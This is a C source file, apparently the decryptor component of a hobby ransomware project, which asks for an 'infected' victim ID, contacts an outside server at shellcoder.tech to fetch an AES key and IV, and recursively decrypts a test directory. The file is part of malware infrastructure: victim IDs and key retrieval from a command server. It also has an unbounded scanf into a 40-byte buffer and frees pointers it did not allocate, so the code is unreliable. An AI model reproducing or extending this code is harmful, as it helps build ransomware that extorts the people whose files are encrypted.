#include "decrypt.h"
#include "curlHelper.h"
#include "fileRecursor.h"
#include <openssl/evp.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>
#include <sys/stat.h>
#include <openssl/aes.h>
#define URL "http://shellcoder.tech/sendDecrypt?infectedId="

int main (int argc, char ** argv) 
{

	char id [40];
	printf("Please enter id\n");
	scanf("%s", id);   
	printf("id: %s\n",id);

	char * curl_address = calloc(1,strlen(URL) +41);
	strcpy(curl_address,URL);
	strcat(curl_address,id);
	printf("curl address: %s\n",curl_address);
	char ** parsedJson = curl(curl_address);

	unsigned char * key = (unsigned char *)parsedJson[1];

	unsigned char *iv = (unsigned char *)parsedJson[2];


	startRecursion("/Users/Chris/Git/Ransomware/TEST",key,iv,id,DECRYPT);

	free(key);
	free(iv);
	free(parsedJson);

	return 1;
}

